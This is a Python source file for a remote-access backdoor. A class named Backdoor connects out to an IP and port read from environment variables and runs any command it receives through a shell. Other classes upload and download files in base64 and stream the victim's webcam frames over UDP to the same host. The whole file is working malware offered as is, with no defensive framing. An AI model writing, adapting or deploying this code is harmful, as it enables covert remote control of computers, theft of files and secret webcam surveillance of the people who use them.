from colorama import (  # type: ignore
   Fore,
   init
)

import subprocess
import threading
import keyboard
import socket
import base64
import dotenv
import json
import sys
import cv2
import os


class CameraSocket(object):

    def __init__(self):
        self.ip = os.getenv("IP")
        self.port = int(os.getenv("CAMERA_PORT"))
        self.buffer = int(os.getenv("BUFFER"))

    def create_connection(self):
        client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        client.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, self.buffer)
        return client


class GetCamera(CameraSocket):

    def __init__(self, loop: bool = True) -> None:
        super(GetCamera, self).__init__()

    def start(self):
        threading.Thread(target=self.get).start()
        return f"{Fore.GREEN}[+] STARTING CAMERA..."

    def get(self):
        client = self.create_connection() 
        camera = cv2.VideoCapture(0)
        while camera.isOpened():
            _, frame = camera.read()
            _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 80])
            message = base64.b64encode(buffer)
            client.sendto(message, (self.ip, self.port))
            cv2.waitKey(1)
            if keyboard.is_pressed("ctrl+alt+space"):
                break

    def stop(self):
        NotImplemented
        return f"{Fore.YELLOW}[!] STOP CAMERA CAPTURE..."


class File(object):

    def __init__(self, filename) -> None:
        self.filename = filename

    def read(self):
        with open(self.filename, "rb") as f:
            return base64.b64encode(f.read())

    def write(self, content) -> str:
        with open(self.filename, "wb") as f:
            f.write(base64.b64decode(content))
            return f"{Fore.GREEN}[+] UPLOAD SUCCESSFUL..."


class ChangeDirectory(object):

    def __init__(self, path):
        self.path = path

    def change(self):
        os.chdir(self.path)
        return f"{Fore.GREEN}[+] CHANGING WORKING DIRECTORY TO {self.path}..."


class Commands(object):

    def __init__(self, command) -> None:
        self.command = command

    def allowed(self):
        return {
            "upload": self.upload_command,
            "cd": self.change_directory,
            "camera": self.camera_command,
            "download": self.download_command
        }

    def verify_command(self):
        commands = self.allowed()
        if self.command[0] in commands.keys():
            return commands.get(self.command[0])()
        return None

    def change_directory(self):
        if len(self.command) > 1:
            return ChangeDirectory(self.command[1]).change()
        return f"{Fore.RED}[-] ERROR..."

    def camera_command(self):
        if self.command[1] == "start":
            return GetCamera().start()

        if self.command[1] == "stop":
            return GetCamera().stop()

        return f"{Fore.RED}[-] CAMERA ERROR..."

    def download_command(self):
        self.command.append(
            File(self.command[1]).read().decode()
        )
        return self.command

    def upload_command(self) -> str:
        return File(self.command[1]).write(self.command[2]) 


class Socket(object):

    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((self.ip, self.port))

    def reliable_send(self, data: str):
        self.connection.send(json.dumps(data).encode("cp850"))

    def reliable_recive(self):
        while True:
            try:
                return json.loads(self.connection.recv(4096).decode())
            except Exception:
                return f"{Fore.RED}[-] JSON ERROR..."


class Backdoor(Socket):

    def __init__(self, ip, port) -> None:
        super().__init__(ip, port)

    def execute_system_command(self, command):
        try:
            return subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        except subprocess.CalledProcessError as e:
            return f"{Fore.RED}[-] COMMAND {e.cmd} RETURN WITH ERROR - CODE {e.returncode}: {e.output}"

    def start(self):
        while True:
            command = self.reliable_recive()

            if command[0] == "exit":
                self.connection.close()
                sys.exit()

            try:
                result = Commands(command).verify_command()
                if not result:
                    result = self.execute_system_command(command).decode("cp850")
            except Exception:
                result = f"{Fore.RED}[-] ERROR DURING COMMAND EXECUTION [CLIENT SIDE]..."
            self.reliable_send(result)


def main():
    dotenv.load_dotenv()
    init(autoreset=True)
    try:
        backdoor = Backdoor(os.getenv("IP"), int(os.getenv("PORT")))
        backdoor.start()
    except Exception as e:
        print(f"{Fore.RED}[-] {e}...")


if __name__ == "__main__":
    main()
